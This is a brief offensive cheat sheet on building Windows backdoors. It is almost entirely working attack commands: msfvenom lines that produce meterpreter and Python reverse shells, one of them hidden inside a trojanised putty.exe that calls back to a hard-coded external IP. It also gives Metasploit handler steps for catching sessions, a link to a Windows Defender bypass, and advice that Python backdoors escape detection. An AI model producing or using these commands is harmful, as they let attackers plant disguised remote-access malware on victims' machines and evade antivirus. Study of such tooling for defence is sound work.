### Windows Backdoors:

#### Payloads: (No chance beacause of windows defender)

$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe > reverse.exe<br>
$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py

#### Payloads hidden in exe:<br>

$ msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=213.32.70.39 LPORT=7777 -x ../putty.exe -f exe-only -o ~/Samples/Bad/putty64-777.exe<br>

Working exploit that avoids windows defender:<br>
https://ired.team/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon

#### Host:

- MSFCONSOLE<br>
    - use /exploit/multi/handler<br>
	- set payload windows/meterpreter/reverse_tcp<br>
	- set LHOST [IP]<br>
	- set LPORT [Port]<br>
	- set ExitOnSession false<br>
	- exploit -j -z<br>
	- sessions -l<br>
	- sessions -i 2<br>
<br>
Python backdoors are safer, as they are not checked by windows defender. There is always a risk with the firewall though.
